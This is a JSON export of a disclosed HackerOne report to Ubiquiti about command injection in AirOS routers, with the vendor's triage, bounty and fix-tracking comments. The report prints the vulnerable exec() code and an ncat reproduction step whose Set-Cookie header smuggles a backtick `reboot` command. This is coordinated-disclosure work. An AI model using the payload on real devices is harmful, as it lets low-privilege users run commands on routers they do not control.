{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2016-07-06T09:36:35.716Z", 
    "voters": [
        "93c08539", 
        "zseano", 
        "jahrek", 
        "ibram", 
        "vijay_kumar", 
        "harry_mg", 
        "dvl", 
        "temmyscript", 
        "craig", 
        "mvbk1991", 
        "and 10 more..."
    ], 
    "facebook_team?": false, 
    "has_bounty?": true, 
    "bounty_amount": "1500.0", 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 128750, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": null, 
    "activity_page_count": 1, 
    "activity_page_number": 1, 
    "title": "Read-Only user can execute arbitraty shell commands on AirOS", 
    "is_member_of_team?": null, 
    "vote_count": 20, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_view?": true, 
            "can_edit?": false, 
            "id": 2294, 
            "content": "This report is the second of a series of three: #119317, #128750 and #139398.\nThe researcher demonstrates how a read-only user can execute shell commands on a AirOS router, bypassing the solution to #119317.", 
            "content_html": "<p>This report is the second of a series of three: <a href=\"/reports/119317\">#119317</a>, <a href=\"/reports/128750\">#128750</a> and <a href=\"/reports/139398\">#139398</a>.<br>\nThe researcher demonstrates how a read-only user can execute shell commands on a AirOS router, bypassing the solution to <a href=\"/reports/119317\">#119317</a>.</p>\n"
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": "2016-08-05T09:36:35.904Z", 
    "state": "Closed", 
    "cve_ids": [], 
    "readable_substate": "Resolved", 
    "public": true, 
    "formatted_bounty": "$1,500", 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2016-04-06T18:02:03.509Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-04-06T18:02:03.509Z", 
            "actor": {
                "username": "ubnt-james", 
                "url": "/ubnt-james", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ubnt", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BugTriaged", 
            "id": 892350, 
            "genius_execution_id": null
        }, 
        {
            "bounty_currency": "usd", 
            "automated_response": false, 
            "created_at": "2016-04-08T15:03:58.280Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-04-08T15:03:58.280Z", 
            "actor": {
                "url": "/ubnt", 
                "profile": {
                    "name": "Ubiquiti Networks"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/800/50186ca2136da762df66f3ba92606dc8b925816f_medium.png?1419364363"
                }
            }, 
            "team_handle": "ubnt", 
            "bounty_amount": "1500.0", 
            "collaborator": {
                "username": "93c08539", 
                "url": "/93c08539"
            }, 
            "message": "Hi there,\n\nWe have addressed this on internal builds for airOS 6 and 7.2+.  I don't have an ETA on when this will be released as final builds go through public beta and can take a few months to resolve all bugs.  I will leave this report open until then.\n\n\nWe may be able to help get your some more hardware to test on.  I should have more details on that in the next week or so.\n\n\nThanks for testing!", 
            "markdown_message": "<p>Hi there,</p>\n\n<p>We have addressed this on internal builds for airOS 6 and 7.2+.  I don&#39;t have an ETA on when this will be released as final builds go through public beta and can take a few months to resolve all bugs.  I will leave this report open until then.</p>\n\n<p>We may be able to help get your some more hardware to test on.  I should have more details on that in the next week or so.</p>\n\n<p>Thanks for testing!</p>\n", 
            "type": "Activities::BountyAwarded", 
            "id": 895941, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-04-08T15:31:23.618Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-04-08T15:31:23.618Z", 
            "actor": {
                "username": "93c08539", 
                "url": "/93c08539", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/033/613/d4625b6884e29918bf51832dcb016b428b55ab8e_medium.png?1536754955"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ubnt", 
            "message": "It would be great if you could get me new equipment.\n\nThanks", 
            "markdown_message": "<p>It would be great if you could get me new equipment.</p>\n\n<p>Thanks</p>\n", 
            "type": "Activities::Comment", 
            "id": 895978, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-04-13T16:24:08.754Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-04-13T16:24:08.754Z", 
            "actor": {
                "username": "93c08539", 
                "url": "/93c08539", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/033/613/d4625b6884e29918bf51832dcb016b428b55ab8e_medium.png?1536754955"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ubnt", 
            "message": "Solved on airOS `v6.0-beta9`, waiting for `v8.0-beta9`, `v7.2+` and/or next stable release.", 
            "markdown_message": "<p>Solved on airOS <code>v6.0-beta9</code>, waiting for <code>v8.0-beta9</code>, <code>v7.2+</code> and/or next stable release.</p>\n", 
            "type": "Activities::Comment", 
            "id": 903739, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-04-16T14:09:29.958Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-04-16T14:09:29.958Z", 
            "actor": {
                "username": "93c08539", 
                "url": "/93c08539", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/033/613/d4625b6884e29918bf51832dcb016b428b55ab8e_medium.png?1536754955"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ubnt", 
            "message": "Solved on `[XC,WA].v8.0-beta10`. Waiting next stable firmware. Due to my lack of equipment, I am extracting the firmware content and comparing the files, so no practical test was done.", 
            "markdown_message": "<p>Solved on <code>[XC,WA].v8.0-beta10</code>. Waiting next stable firmware. Due to my lack of equipment, I am extracting the firmware content and comparing the files, so no practical test was done.</p>\n", 
            "type": "Activities::Comment", 
            "id": 909551, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-05-26T17:38:29.211Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-05-26T17:38:29.211Z", 
            "actor": {
                "username": "93c08539", 
                "url": "/93c08539", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/033/613/d4625b6884e29918bf51832dcb016b428b55ab8e_medium.png?1536754955"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ubnt", 
            "message": "NOT Solved in `airOS 5.6.6`.", 
            "markdown_message": "<p>NOT Solved in <code>airOS 5.6.6</code>.</p>\n", 
            "type": "Activities::Comment", 
            "id": 985528, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-05-26T17:40:47.649Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-05-26T17:40:47.649Z", 
            "actor": {
                "username": "ubnt-matt", 
                "url": "/ubnt-matt", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ubnt", 
            "message": "@93c08539 can you confirm if you downloaded the latest firmware version as of today? Yesterday we uploaded the wrong version for v5.6.6.\n\nDo you have any info or POC we can share with developers?\n", 
            "markdown_message": "<p><a href=\"/93c08539\">@93c08539</a> can you confirm if you downloaded the latest firmware version as of today? Yesterday we uploaded the wrong version for v5.6.6.</p>\n\n<p>Do you have any info or POC we can share with developers?</p>\n", 
            "type": "Activities::Comment", 
            "id": 985536, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-05-26T17:56:17.076Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-05-26T17:56:17.076Z", 
            "actor": {
                "username": "93c08539", 
                "url": "/93c08539", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/033/613/d4625b6884e29918bf51832dcb016b428b55ab8e_medium.png?1536754955"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ubnt", 
            "message": "@ubnt-matt The version available is vulnerable.\n\nThis line is present in `XM.v5.6.6.29183.160526.1225.bin`:\n```\n$cookie_regex = \"^Set-Cookie: ([AIROS_[:print:]]+)=([[:alnum:]]{32});\";\n```\n\nWhile this one is present in `XC.v8.0-beta11.30850.160425.1821.bin`:\n```\n$new_regex = \"^Set-Cookie: (AIROS_[[:xdigit:]]{12})=([[:xdigit:]]{32});\";\n```\n\nYou can see that `[[:xdigit:]]{12}` solves the problem. Do you implemented the solution in other part of the code?", 
            "markdown_message": "<p><a href=\"/ubnt-matt\">@ubnt-matt</a> The version available is vulnerable.</p>\n\n<p>This line is present in <code>XM.v5.6.6.29183.160526.1225.bin</code>:</p>\n<pre class=\"highlight plaintext\"><code>$cookie_regex = &quot;^Set-Cookie: ([AIROS_[:print:]]+)=([[:alnum:]]{32});&quot;;\n</code></pre>\n<p>While this one is present in <code>XC.v8.0-beta11.30850.160425.1821.bin</code>:</p>\n<pre class=\"highlight plaintext\"><code>$new_regex = &quot;^Set-Cookie: (AIROS_[[:xdigit:]]{12})=([[:xdigit:]]{32});&quot;;\n</code></pre>\n<p>You can see that <code>[[:xdigit:]]{12}</code> solves the problem. Do you implemented the solution in other part of the code?</p>\n", 
            "type": "Activities::Comment", 
            "id": 985562, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-05-27T16:04:03.065Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-05-27T16:04:03.065Z", 
            "actor": {
                "username": "93c08539", 
                "url": "/93c08539", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/033/613/d4625b6884e29918bf51832dcb016b428b55ab8e_medium.png?1536754955"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ubnt", 
            "message": "Fixed in `v7.2.2`.", 
            "markdown_message": "<p>Fixed in <code>v7.2.2</code>.</p>\n", 
            "type": "Activities::Comment", 
            "id": 987462, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-07-05T16:23:16.255Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-07-05T16:23:16.255Z", 
            "actor": {
                "username": "93c08539", 
                "url": "/93c08539", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/033/613/d4625b6884e29918bf51832dcb016b428b55ab8e_medium.png?1536754955"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ubnt", 
            "message": "Fixed in `v5.6.7` and `v7.2.3`", 
            "markdown_message": "<p>Fixed in <code>v5.6.7</code> and <code>v7.2.3</code></p>\n", 
            "type": "Activities::Comment", 
            "id": 1053983, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "93c08539", 
                "url": "/93c08539"
            }, 
            "created_at": "2016-07-06T00:55:00.351Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-07-06T00:55:00.351Z", 
            "actor": {
                "username": "ubnt-james", 
                "url": "/ubnt-james", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ubnt", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BugResolved", 
            "id": 1054821, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-07-06T09:36:35.765Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-07-06T09:36:35.765Z", 
            "actor": {
                "username": "93c08539", 
                "url": "/93c08539", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/033/613/d4625b6884e29918bf51832dcb016b428b55ab8e_medium.png?1536754955"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "ubnt", 
            "first_to_agree": true, 
            "message": "Fixed in the last stable version", 
            "markdown_message": "<p>Fixed in the last stable version</p>\n", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 1055268, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-08-05T09:36:57.607Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-08-05T09:36:57.607Z", 
            "actor": {
                "url": "/ubnt", 
                "profile": {
                    "name": "Ubiquiti Networks"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/800/50186ca2136da762df66f3ba92606dc8b925816f_medium.png?1419364363"
                }
            }, 
            "team_handle": "ubnt", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 1107859, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "93c08539", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/93c08539", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/033/613/cf19d8cc729e17c9fd3dfa2bc561766ee0c83588_small.png?1536754955"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 58, 
        "name": "Command Injection - Generic"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -73746854.30683777, 
    "disclosed_at": "2016-08-05T09:36:57.479Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/128750", 
    "created_at": "2016-04-06T16:54:03.718Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p>This issue is similar to <a href=\"/reports/119317\">#119317</a>, but happen on the server side data (actionRemote).</p>\n\n<p>The function &quot;parseHeaders&quot; in remote.inc:38 don&#39;t sanitize the input received from the other server (other side of the speed test). If the attacker started an speed test against a controlled server (attacker itself) and returned a cookie with special shell character will be possible to inject commands.</p>\n\n<p>Injection Point:</p>\n<pre class=\"highlight plaintext\"><code>Function parseHeaders $headers\n(\n    global $session_key, $session_value;\n    $cookie_regex = &quot;^Set-Cookie: ([AIROS_[:print:]]+)=([[:alnum:]]{32});&quot;;\n\n    $i = 0;\n    while ($i &lt; count($headers)) {\n        if (ereg($cookie_regex, $headers[$i], $regs)) {\n            $session_key = $regs[1];  //code injection in this variable\n            $session_value = $regs[2];\n            return 0;\n        }\n        $i++;\n    }\n    return $i;\n);\n</code></pre>\n<p>On doLogin (remote.inc:144, via buildCookieStr), the &quot;$session_key&quot; variable is passed to be executed without verification.</p>\n\n<p>remote.inc:146, doLogin():</p>\n<pre class=\"highlight plaintext\"><code>    $session_str = buildCookieStr(); //return the session_key value\n\n    $cfgfile = &quot;/tmp/.trigger.txt&quot;;\n    writeConfig($cfgfile, $login, $passwd);\n\n    $cmd = $cmd_trigger + $session_str; //now cmd have shell code\n    $cmd += &quot; -c $cfgfile&quot;;\n\n    $url = EscapeShellCmd($base_url + &quot;/login.cgi&quot;);\n    $full_cmd = &quot;$cmd $url&quot;;  //now full_cmd have shell code\n\n    exec($full_cmd, $lines, $res); //shell code executed\n</code></pre>\n<h1 id=\"reproducing-the-attack\">Reproducing the attack:</h1>\n\n<p>Fist run the server that will return the cookie: </p>\n<pre class=\"highlight plaintext\"><code>$ echo -en &quot;HTTP/1.1 200 OK\\r\\nSet-Cookie: AIROS_\\`reboot\\`=12345678901234567890123456789012;\\r\\nContent-Length: 1\\r\\nContent-Type: text/html\\r\\n\\r\\nA&quot; | ncat -l -p 8080\n</code></pre>\n<p>Then execute the speed test against this target.</p>\n\n<p>In this Exemple: <a title=\"http://192.168.1.100:8080\" href=\"/redirect?signature=bbeeb4f5d93d79684db8c8de0d08a32003ec1a64&amp;url=http%3A%2F%2F192.168.1.100%3A8080\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://192.168.1.100:8080</span><i class=\"icon-external-link\"></i></a></p>\n\n<p>I Hope you like this report, because I burned my new PicoStation while trying to unbrick it using a ttl cable, after a unsuccessful downgrade :(</p>\n", 
    "vulnerability_information": "This issue is similar to #119317, but happen on the server side data (actionRemote).\n\nThe function \"parseHeaders\" in remote.inc:38 don't sanitize the input received from the other server (other side of the speed test). If the attacker started an speed test against a controlled server (attacker itself) and returned a cookie with special shell character will be possible to inject commands.\n\nInjection Point:\n```\nFunction parseHeaders $headers\n(\n\tglobal $session_key, $session_value;\n\t$cookie_regex = \"^Set-Cookie: ([AIROS_[:print:]]+)=([[:alnum:]]{32});\";\n\n\t$i = 0;\n\twhile ($i < count($headers)) {\n\t\tif (ereg($cookie_regex, $headers[$i], $regs)) {\n\t\t\t$session_key = $regs[1];  //code injection in this variable\n\t\t\t$session_value = $regs[2];\n\t\t\treturn 0;\n\t\t}\n\t\t$i++;\n\t}\n\treturn $i;\n);\n```\n\nOn doLogin (remote.inc:144, via buildCookieStr), the \"$session_key\" variable is passed to be executed without verification.\n\nremote.inc:146, doLogin():\n```\n\t$session_str = buildCookieStr(); //return the session_key value\n\n\t$cfgfile = \"/tmp/.trigger.txt\";\n\twriteConfig($cfgfile, $login, $passwd);\n\n\t$cmd = $cmd_trigger + $session_str; //now cmd have shell code\n\t$cmd += \" -c $cfgfile\";\n\n\t$url = EscapeShellCmd($base_url + \"/login.cgi\");\n\t$full_cmd = \"$cmd $url\";  //now full_cmd have shell code\n\n\texec($full_cmd, $lines, $res); //shell code executed\n```\n\n#Reproducing the attack:\nFist run the server that will return the cookie: \n```\n$ echo -en \"HTTP/1.1 200 OK\\r\\nSet-Cookie: AIROS_\\`reboot\\`=12345678901234567890123456789012;\\r\\nContent-Length: 1\\r\\nContent-Type: text/html\\r\\n\\r\\nA\" | ncat -l -p 8080\n```\n\nThen execute the speed test against this target.\n\nIn this Exemple: http://192.168.1.100:8080\n\nI Hope you like this report, because I burned my new PicoStation while trying to unbrick it using a ttl cable, after a unsuccessful downgrade :(", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "http://ubnt.com", 
            "about": "", 
            "twitter_handle": "", 
            "name": "Ubiquiti Networks"
        }, 
        "handle": "ubnt", 
        "url": "https://hackerone.com/ubnt", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/000/800/19a040983c9b2494808c87f77337d30023b97ea7_small.png?1419364363", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/000/800/50186ca2136da762df66f3ba92606dc8b925816f_medium.png?1419364363"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 800, 
        "default_currency": "usd"
    }, 
    "is_published": false
}